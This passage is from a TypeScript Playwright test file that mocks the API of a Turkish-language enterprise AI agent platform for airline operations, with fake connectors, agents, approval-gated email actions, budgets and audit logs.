    connector('successfactors', 'SuccessFactors', 'SF', 'data', 'attention', ['read'], 'Çalışan, departman, pozisyon ve lokasyon (OData, salt okunur).', { uses_this_week: 9 }),
    connector('outlook', 'Outlook', 'OL', 'setup', 'not_configured', [], 'Kişisel posta kutusundan okuma ve gönderme (Microsoft Graph).'),
    connector('email', 'E-posta', 'EP', 'channel', 'not_configured', ['write·approval'], 'Agent e-postaları ve rapor teslimi (onaydan sonra).'),
    connector('teams', 'Teams', 'TM', 'channel', 'attention', ['write·approval'], 'İzinli kanallara mesaj (gelen webhook, onaydan sonra).'),
    connector('sharepoint', 'SharePoint', 'SP', 'setup', 'not_configured', [], 'Sigorta, sözleşme ve finans dokümanları.'),
    connector('airrm', 'AirRM', 'RM', 'setup', 'not_configured', [], 'Gelir yönetimi tahminleri ve fiyat sınıfları.'),
    connector('oracle', 'Oracle', 'OR', 'setup', 'not_configured', [], 'Finans, bütçe ve tedarikçi verisi.'),
  ]
  const apmDetail = () => ({
    ...connectorList()[1],
    disabled: state.apmDisabled ? { reason: 'APM bakımda', by: 'Kerem B.', at: now.toISOString() } : null,
    checks: Array.from({ length: 96 }, (_, i) => ({ ok: i !== 40, at: new Date(now.getTime() - (96 - i) * 15 * 60_000).toISOString(), duration_ms: 180 })),
    avg_duration_ms: 182, last_error: { message: 'RuntimeException: APM\'ye ulaşılamadı.', at: new Date(now.getTime() - 14 * 3600_000).toISOString() }, checkable: true,
    tools: [
      { name: 'query_apm', kind: 'read', label: 'APM sorgusu', description: 'Uçuşlar, rötarlar, zamanındalık.' },
      { name: 'describe_apm', kind: 'read', label: 'APM uç bilgisi', description: 'APM işlemleri ve alanları.' },
      { name: 'preview_apm', kind: 'read', label: 'preview_apm', description: 'APM isteğini akış kurmadan önce denemek (örnek kayıtlar maskeli).' },
    ],
    used_by: [{ id: 7, name: 'Sabah Operasyon Özeti', status: 'live', owner: 'Kerem B.' }, { id: 8, name: 'Uzun Rötar Bildirimi', status: 'pilot', owner: 'Kerem B.' }],
    chat_queries_7d: 52,
    protection: { masked_groups: ['Ad ve soyad', 'İletişim bilgileri', 'Rezervasyon ve bilet kimlikleri', 'Kimlik belgeleri ve doğum tarihi', 'Adres, ödeme ve maaş', 'Serbest metin (not, açıklama)'], rules: ['Sadece 6 okuma ucu sorgulanabilir; yanıt izinli alanlara indirilir.', 'Mürettebat adları ve iletişim bilgileri hiç okunmaz.', "Claude'a en fazla 200 satır gider; kişisel veri içerik taramasıyla da maskelenir."] },
    needs: [],
    env: ['APM_BASE_URL', 'APM_KESTRA_BASE_URL', 'APM_GRANT_TYPE', 'APM_CLIENT_ID', 'APM_CLIENT_SECRET'].map((name) => ({ name, defined: true })).concat([{ name: 'APM_USERNAME', defined: false }, { name: 'APM_PASSWORD', defined: false }]),
    affected_agents: 2,
  })
  const card = (id: number, name: string, status: string, icon: string, systems: string[], extra: Record<string, unknown> = {}) => ({
    id, slug: `a${id}`, name, description: 'Dünkü uçuş sayısını, zamanında kalkışı, iptalleri ve en uzun rötarları nedenleriyle özetler.', status, icon, tools: [], systems,
    owner: { id: 1, name: 'Kerem B.', title: 'OCC Müdürü' }, department: 'Operasyon', department_id: 1, trigger: 'Her gün 06:00', mine: true, created_at: now.toISOString(),
    runs_7d: 7, runs_30d: 30, useful_pct: 96, approved_actions_30d: 21, last_run_at: now.toISOString(), ...extra,
  })
  const registry = () => ({
    counts: { live: 1, pilot: 1, draft: 1, paused: 0, template: 2 },
    agents: [
      card(7, 'Sabah Operasyon Özeti', 'live', 'SO', ['APM', 'IBS', 'E-posta']),
      card(8, 'Uzun Rötar Bildirimi', 'pilot', 'UR', ['APM', 'Teams'], { department: 'OCC', runs_7d: 3, runs_30d: 9, useful_pct: null, trigger: 'Uçuş rötarı ≥ 120 dk' }),
      card(9, 'İK Değişiklik Özeti', 'draft', 'İK', ['SuccessFactors', 'E-posta'], { department: 'İnsan Kaynakları', runs_7d: 0, runs_30d: 0, useful_pct: null, approved_actions_30d: 0 }),
    ],
    templates: [
      card(20, 'Rötar Nedeni Analizi', 'template', 'RN', ['APM', 'E-posta'], { key: 'delay-analysis', owner: null, department: null }),
      card(21, 'Sabah Operasyon Özeti', 'template', 'SO', ['APM', 'IBS', 'E-posta'], { key: 'morning-brief', owner: null, department: null }),
    ],
  })
  const day = (i: number) => new Date(now.getTime() - (29 - i) * 86_400_000).toISOString().slice(0, 10)
  const runRow = (r: { id: number; status: string; started_at: string; cost_usd: number }) => ({ id: r.id, status: r.status, origin: 'manual', is_test: false, attempts: 1, summary: null, started_at: r.started_at, duration_seconds: 44, cost_usd: r.cost_usd, actions_approved: 1, actions_total: 1, score: 100 })
  const pastRuns = [3, 2, 1].map((d, i) => ({ id: 40 + i, status: 'succeeded', origin: 'schedule', is_test: false, attempts: i === 2 ? 2 : 1, summary: null, started_at: new Date(now.getTime() - d * 86_400_000).toISOString(), duration_seconds: 44 + i * 3, cost_usd: 0.21 + i * 0.01, actions_approved: 1, actions_total: 1, score: [100, 67, 100][i] }))
  const manualRun = () => ({
    id: 32, agent: { id: 7, name: 'Sabah Operasyon Özeti' }, status: 'succeeded', origin: 'manual', is_test: false, attempts: 1, input: 'Dünkü operasyon özetini hazırla ve gönder.',
    summary: 'Dün 142 uçuş, %84 zamanında kalkış.', output: 'Dün **142 uçuş** yapıldı, kalkışta zamanındalık **%84**.', error: null, cost_usd: 0.226, conversation_id: 81,
    started_at: now.toISOString(), finished_at: now.toISOString(), duration_seconds: 47, trace: [], feedback: { useful: 0, not_useful: 0, mine: null },
    score: { score: 100, model: 'claude-sonnet-5-5', created_at: now.toISOString(), details: [
      { rule: 'Her rötar nedeni bir rötar koduna dayanıyor', passed: true, reason: 'En uzun rötarların hepsinde kod var.' },
      { rule: 'Özet 200 kelimeyi geçmiyor', passed: true, reason: 'Özet yaklaşık 60 kelime.' },
    ] },
    actions: [{ id: 2, type: 'send_email', status: 'executed', requires_approval: true, payload: { to: ['kerem@freebird.com.tr'], subject: 'Operasyon özeti · 11 Eki' }, reason: null }],
  })
  const agentDetail = () => ({
    ...card(7, 'Sabah Operasyon Özeti', 'live', 'SO', ['APM', 'IBS', 'E-posta']), version: 4, conversation_id: 70, can_manage: true, can_chat: true, suggested_prompts: ['Dün en uzun rötar hangi seferdeydi?'],
    overview: {
      kpis: { runs: 30, retried: 1, success_rate: 100, avg_seconds: 48, avg_seconds_delta: -6, cost_usd: 6.48, cost_per_run_usd: 0.216, useful_pct: 96, score_avg: 89, scored_runs: 30, feedback: { useful: 24, not_useful: 1 }, actions_approved: 41, actions_total: 43 },
      days: Array.from({ length: 30 }, (_, i) => ({ date: day(i), succeeded: i === 14 ? 0 : 1, retried: i === 14 ? 1 : 0, failed: 0, other: 0 })),
      config: { trigger: 'Elle · Her gün 06:00', delivery: 'E-posta gönder → occ@freebird.com.tr · Fortis Inbox onayı', reads: 'APM, IBS · salt okunur', writes: 'E-posta (onaydan sonra)', model: 'Auto', memory: "Bellek A5'te gelecek" },
    },
    recent_runs: [...(state.manualRun ? [runRow(manualRun())] : []), ...pastRuns],
    draft: null,
  })
  const architectAgent = () => ({
    id: 7, slug: 'sabah-operasyon-ozeti', name: 'Sabah Operasyon Özeti', description: 'Dünkü operasyonu özetler.', icon: 'SO', status: state.agent?.status ?? 'draft', version: 1,
    updated_at: new Date(now.getTime() - 60_000).toISOString(), conversation_id: 70, instructions: 'x', model: 'auto',
    tools: [
      { name: 'query_apm', kind: 'read', system: 'APM', label: 'APM sorgusu' },
      { name: 'query_warehouse', kind: 'read', system: 'IBS', label: 'IBS sorgusu' },
      { name: 'send_email', kind: 'write', system: 'E-posta', label: 'E-posta gönder', constraints: { max_per_run: 1 } },
    ],
    triggers: [
      { id: 1, type: 'manual', config: {}, input_template: null, enabled: true, kestra_flow_id: null, synced_at: null, sync_error: null },
      { id: 2, type: 'schedule', config: { cron: '0 6 * * *' }, input_template: 'Dünkü operasyon özetini hazırla ve gönder.', enabled: true, kestra_flow_id: null, synced_at: null, sync_error: null },
    ],
    approval_policy: { send_email: { mode: 'always' }, approvers: ['owner'] },
    plan: [
      { type: 'trigger', title: 'Her gün 06:00', detail: 'Zamanlama · Europe/Istanbul' },
      { type: 'read', title: 'APM · dünkü uçuşlar ve rötar kodları', detail: 'salt okunur' },
      { type: 'lookup', title: 'IBS · etkilenen rotaların doluluğu', detail: 'salt okunur' },
      { type: 'decide', title: 'Rötar 15 dakikadan uzun mu?', no: 'Özete dahil etme' },
      { type: 'draft', title: 'Özet e-postası', detail: 'Auto model' },
      { type: 'approve', title: 'Sahibi onaylar', detail: 'Fortis Inbox' },
      { type: 'act', title: 'E-postayla gönder', detail: 'denetim kaydına yazılır' },
    ],
    suggested_prompts: [], reads: ['APM', 'IBS'], writes: ['E-posta'], estimated_cost_usd: state.agent?.tested ? 0.214 : null,
    last_test_run: state.agent?.tested ? testRun() : null, can_go_live: false, has_draft: true,
  })

  page.route('**/sanctum/csrf-cookie', (route) => route.fulfill({ status: 204 }))
  page.route('**/api/**', async (route) => {
    const url = new URL(route.request().url())
    const path = url.pathname.replace(/^\/api/, '')
    const method = route.request().method()

    if (path === '/auth/config') return json(route, { data: { driver: 'password', locale: state.locale } })
    if (path === '/auth/login') {
      state.signedIn = true
      return json(route, { data: { ...fakeUser, theme: state.theme } })
    }
    if (!state.signedIn) return json(route, { message: 'Unauthenticated.' }, 401)
    if (path === '/auth/me') return json(route, { data: { ...fakeUser, theme: state.theme, locale: state.locale } })
    if (path === '/auth/logout') {
      state.signedIn = false
      return route.fulfill({ status: 204 })
    }
    if (path === '/me/preferences') {
      const body = route.request().postDataJSON()
      if (body.theme) state.theme = body.theme
      if (body.locale) state.locale = body.locale
      return json(route, { data: { ...fakeUser, theme: state.theme, locale: state.locale } })
    }
    if (path === '/home') {
      return json(route, { data: { greeting_name: 'Kerem', waiting_total: state.approved ? 0 : 1, suggestions: [
        { type: 'question', text: 'Dün yük faktörü en düşük rotalar hangileriydi?' },
        { type: 'question', text: 'Dün en çok rötar yapan 5 uçuş hangileri?' },
        { type: 'agent', text: 'Her sabah dünkü rötarları özetleyen bir agent kur' },
        { type: 'report', text: 'Dünkü iptal edilen uçuşları Excel olarak ver' },
      ], waiting: state.approved ? [] : [{ id: 1, kind: 'approval', title: 'Sigorta bildirimi', detail: 'Devam etmek için onayın gerekiyor.', since: new Date(now.getTime() - 12 * 60_000).toISOString() }],
      activity: [{ id: 'run1', title: 'Sabah özeti', state: 'SUCCESS', tone: 'ok', detail: 'Başarıyla tamamlandı', time: '06:00' }, { id: 'run2', title: 'Yakıt izleme', state: 'FAILED', tone: 'bad', detail: 'Hata verdi', time: '09:02' }] } })
    }
    if (path === '/inbox/count') return json(route, { data: { action: state.approved ? 0 : 1 } })
    if (path === '/inbox') {
      const tab = url.searchParams.get('tab') ?? 'all'
      const open = state.approved ? [] : [inboxItem()]
      const data = tab === 'done' ? (state.approved ? [{ ...inboxItem(), status: 'done', actionable: false, read: true }] : []) : tab === 'updates' || tab === 'mentions' ? [] : open
      return json(route, { data, counts: { all: open.length, action: open.length, mentions: 0, updates: 0, done: state.approved ? 1 : 0 } })
    }
    if (path === '/inbox/1/approve') {
      state.approved = true
      return json(route, { data: inboxDetail() })
    }
    if (path === '/inbox/1') return json(route, { data: inboxDetail() })
    if (path === '/connectors/status') {
      return json(route, { data: [
        { key: 'ibs', label: 'IBS', abbr: 'IB', status: 'connected', detail: null },
        { key: 'apm', label: 'APM', abbr: 'AP', status: state.apmDisabled ? 'disabled' : 'connected', detail: state.apmDisabled ? 'Yönetici tarafından şirket genelinde kapatıldı.' : null },
        { key: 'successfactors', label: 'SuccessFactors', abbr: 'SF', status: 'attention', detail: 'Son kontrol başarısız.' },
        { key: 'outlook', label: 'Outlook', abbr: 'OL', status: 'not_configured', detail: null },
        { key: 'teams', label: 'Teams', abbr: 'TM', status: 'not_configured', detail: null },
      ] })
    }
    if (path === '/connectors') return json(route, { data: connectorList(), summary: { connected: 2, attention: 1, needs_setup: 6, disabled: state.apmDisabled ? 1 : 0 } })
    if (path === '/connectors/apm/disable') {
      state.apmDisabled = true
      return json(route, { data: apmDetail() })
    }
    if (path === '/connectors/apm/enable') {
      state.apmDisabled = false
      return json(route, { data: apmDetail() })
    }
    if (path === '/connectors/apm') return json(route, { data: apmDetail() })
    if (path === '/governance/overview') return json(route, { data: governance() })
    if (path === '/governance/usage') return json(route, { data: usageReport() })
    if (path === '/governance/policies') {
      if (method === 'PUT') {
        const patch = route.request().postDataJSON() as Record<string, unknown>
        for (const [key, value] of Object.entries(patch)) {
          state.audit.unshift({ id: 100 + state.audit.length, at: now.toISOString(), actor_type: 'user', actor: 'Kerem B.', action: 'settings.update', subject: null, system: null, result: 'allowed', cost_usd: null, meta: { setting: key, before: state.policies[key], after: value } })
          state.policies[key] = value
        }
      }
      return json(route, { data: policiesData() })
    }
    if (path === '/audit-logs') {
      const action = url.searchParams.get('action')
      const rows = [...state.audit, ...baseAudit()].filter((r) => !action || (action.endsWith('*') ? r.action.startsWith(action.slice(0, -1)) : r.action === action))
      return json(route, { data: rows, next_cursor: null, options: { actions: ['agent.tool_blocked', 'ai.query', 'auth.login_failed', 'settings.update'], users: [{ id: 1, name: 'Kerem B.' }, { id: 3, name: 'Selin A.' }] } })
    }
    if (path === '/governance/budgets') {
      if (method === 'PUT') {
        const ops = (route.request().postDataJSON().budgets as { scope: string; scope_id?: number; monthly_limit_usd: number; warn_at_percent: number; hard_stop: boolean }[]).find((b) => b.scope_id === 1)
        if (ops) state.opsBudget = ops.monthly_limit_usd ? { monthly_limit_usd: ops.monthly_limit_usd, warn_at_percent: ops.warn_at_percent, hard_stop: ops.hard_stop } : null
      }
      return json(route, { data: budgetsData() })
    }
    if (path === '/governance/runs/31/stop') {
      state.stopped = true
      return json(route, { data: { live: governance().live } })
    }
    if (path === '/governance/alerts/9/resolve') {
      state.resolved = true
      return json(route, { data: governance().alerts[0] ?? {} })
    }
    if (/^\/messages\/\d+\/feedback$/.test(path)) {
      state.feedback.push(route.request().postDataJSON())
      return json(route, { data: route.request().postDataJSON() })
    }
    if (/^\/conversations\/\d+\/messages$/.test(path)) {
      const body = route.request().postDataJSON()
      state.messagesSent.push(body)
      return route.fulfill({ status: 200, contentType: 'text/event-stream', body: body.answer ? answerStream(body) : questionStream(body.content) })
    }
    if (/^\/conversations\/\d+$/.test(path) && method === 'PATCH') {
      return json(route, { data: { ...state.conversations[0], ...route.request().postDataJSON() } })
    }
    if (path === '/conversations' && method === 'POST') {
      const conversation = { id: state.conversations.length + 10, title: null, kind: 'chat', model: null, effective_model: 'claude-sonnet-5-5', usage: { calls: 0, tokens: 0, cost_usd: 0 }, messages: [], created_at: '', updated_at: '' }
      state.conversations.unshift(conversation)
      return json(route, { data: conversation }, 201)
    }
    if (path === '/conversations') return json(route, { data: state.conversations })
    if (path === '/conversations/20') return json(route, { data: chartConversation() })
    if (path === '/conversations/21') return json(route, { data: pageConversation() })
    if (path === '/artifacts/art_pano' || path === '/artifacts/art_evil') return json(route, { data: pageDetail(path.split('/')[2]) })
    if (/^\/artifacts\/art_\w+\/downloaded$/.test(path)) {
      state.downloads.push(path)
      return json(route, { data: { ok: true } })
    }
    if (path === '/conversations/70') return json(route, { data: { id: 70, title: 'Architect', kind: 'architect', model: null, effective_model: 'claude-sonnet-5-5', usage: { calls: 0, tokens: 0, cost_usd: 0 }, messages: [], created_at: '', updated_at: '' } })
    if (/^\/conversations\/\d+$/.test(path) && path !== '/conversations/5') return json(route, { data: state.conversations.find((c) => `/conversations/${c.id}` === path) })
    if (path === '/flows') return json(route, { data: [], unmanaged: [], kestra_error: null })
    if (path === '/voice/config') return json(route, { enabled: false, max_seconds: 30 })
    if (path.startsWith('/usage/daily')) return json(route, { data: [] })
    if (path.startsWith('/usage/by-model')) return json(route, { data: [] })
    if (path.startsWith('/usage/by-flow')) return json(route, { data: [] })
    if (path === '/flows/1/editor') return json(route, { data: flow() })
    if (path === '/catalog/blocks') return json(route, { blocks: catalog.blocks, apps })
    if (path === '/settings/ai') return json(route, { data: { models: [{ id: 'claude-sonnet-5-5', label: 'Claude Sonnet 5.5' }], default_model: 'claude-sonnet-5-5', monthly_budget_usd: null, budget_blocks_flow_ai_steps: false, ai_data_access: 'off', ai_allow_employee_names: true } })
    if (path === '/flows/1/editor-conversation') return json(route, { data: { id: 5 } })
    if (path === '/build') {
      return json(route, { data: {
        examples: ["Her sabah 06:00'da dünkü rötarları ve nedenlerini özetleyip OCC ekibine e-postayla gönder", "Bir uçuşun rötarı 2 saati geçince uçağın sonraki bacaklarını özetleyip ops ekibine Teams'ten bildir", 'Her cuma bu haftanın işe giriş ve ayrılışlarını departmanlara göre özetle'],
        templates: [
          { key: 'morning-brief', name: 'Sabah Operasyon Özeti', description: null, icon: 'SO', systems: ['APM', 'IBS', 'E-posta'], trigger: 'Zamanlama: 0 6 * * *', available: true },
          { key: 'delay-analysis', name: 'Rötar Nedeni Analizi', description: null, icon: 'RN', systems: ['APM', 'E-posta'], trigger: 'Zamanlama: 0 8 * * 1', available: true },
          { key: 'long-delay-alert', name: 'Uzun Rötar Bildirimi', description: null, icon: 'UR', systems: ['APM', 'Teams'], trigger: 'Olay: flight.delayed (≥ 120 dk)', available: true },
          { key: 'hr-changes', name: 'İK Değişiklik Özeti', description: null, icon: 'İK', systems: ['SuccessFactors', 'E-posta'], trigger: 'Zamanlama: 0 16 * * 5', available: true },
        ],
        departments: [{ id: 1, name: 'Operasyon' }], default_department_id: 1, agents: [],
      } })
    }
    if (path === '/agents' && method === 'POST') {
      state.agent = { status: 'draft', tested: false }
      return json(route, { data: architectAgent() }, 201)
    }
    if (path === '/agents/7/architect') return json(route, { data: architectAgent() })
    if (path === '/agents/7/status') {
      state.agent!.status = route.request().postDataJSON().status
      return json(route, { data: architectAgent() })
    }
    if (path === '/agents/7/runs' && method === 'POST') {
      if (route.request().postDataJSON().test) {
        state.agent!.tested = true
        return json(route, { data: testRun() }, 201)
      }
      state.manualRun = true
      return json(route, { data: manualRun() }, 201)
    }
    if (path === '/agents/7/runs') return json(route, { data: [...(state.manualRun ? [runRow(manualRun())] : []), ...pastRuns] })
    if (path === '/agent-runs/31') return json(route, { data: testRun() })
    if (path === '/agent-runs/32') return json(route, { data: { ...manualRun(), feedback: { useful: state.useful ? 1 : 0, not_useful: 0, mine: state.useful ? 'useful' : null } } })
    if (path === '/agent-runs/32/feedback') {
      state.useful = true
      return json(route, { data: { ...manualRun(), feedback: { useful: 1, not_useful: 0, mine: 'useful' } } })
    }
    if (path === '/agents' && method === 'GET') return json(route, { data: registry() })
    if (path === '/agents/7') return json(route, { data: agentDetail() })
    if (path === '/agents/7/evaluation') return json(route, { data: {
      criteria: ['Her rötar nedeni bir rötar koduna dayanıyor', 'Özet 200 kelimeyi geçmiyor', 'Rakamlar kaynak sorgularla tutarlı'], enabled: true, can_edit: true, avg_score_30d: 89, scored_runs_30d: 30,
      rule_pass_rates: [{ rule: 'Her rötar nedeni bir rötar koduna dayanıyor', checked: 30, pass_pct: 93 }, { rule: 'Özet 200 kelimeyi geçmiyor', checked: 30, pass_pct: 100 }, { rule: 'Rakamlar kaynak sorgularla tutarlı', checked: 30, pass_pct: 73 }],
      recent: pastRuns.map((r) => ({ run_id: r.id, score: r.score, started_at: r.started_at })),
    } })
    if (path === '/conversations/5') return json(route, { data: { id: 5, title: 'editör', kind: 'editor', model: null, effective_model: 'claude-sonnet-5-5', usage: { calls: 0, tokens: 0, cost_usd: 0 }, messages: [], created_at: '', updated_at: '' } })
    if (path.startsWith('/usage/summary')) return json(route, { data: { month: '2026-10', cost_usd: 1.2, calls: 3, input_tokens: 1, output_tokens: 1, avg_cost_per_call: 0.4, flow_runs: 1, flow_step_calls: 0, previous_cost_usd: 0, change_pct: null, budget: { limit: null, spent: 1.2, ratio: null }, blocks_flow_ai_steps: false } })

    if (path === '/flows/1/operations' && method === 'POST') {
      const body = route.request().postDataJSON()
      if (body.base_version !== state.version) return json(route, { message: 'conflict', errors: [], latest_version: state.version }, 409)
      const created: string[] = []
      for (const op of body.operations) {
        state.operations.push(op)
        if (op.op === 'update_settings') Object.assign(find(state.graph.tasks, op.task_id)!.settings, op.settings)
        if (op.op === 'insert') {
          const list = op.parent_id ? find(state.graph.tasks, op.parent_id)!.children! : state.graph.tasks
          const index = op.after_id ? list.findIndex((n) => n.id === op.after_id) + 1 : 0
          list.splice(index, 0, { id: op.kind, kind: op.kind, label: 'Bildirim · Teams', title: (op.settings.title as string) ?? null, settings: op.settings, readonly: false, raw_type: null, writes: true })
          created.push(op.kind)
        }
      }
      state.version++
      return json(route, { data: flow(), created, changed: true })
    }

    if (path === '/flows/1/publish') {
      state.published = state.version
      return json(route, { data: flow() })
    }
    if (path === '/flows/1/test-run') return json(route, { data: run, skipped: ['notify_teams', 'send_mail'] }, 201)
    if (path === '/executions') return json(route, { data: [{ kestra_execution_id: 'run1', namespace: 'fortis.chat.test', is_test: true, flow: { id: 1, flow_id: 'long-delay-notice', title: 'Uzun rötar bildirimi' }, state: 'SUCCESS', start: run.started_at, end: run.ended_at, duration: 'PT4S', trigger: 'Elle' }], total: 1, counts: { paused: 0, failed: 0 } })
    if (path === '/executions/run1') return json(route, { data: run })

    return json(route, { message: `Sahte backend: ${method} ${path} tanımsız` }, 404)
  })

  return state
}
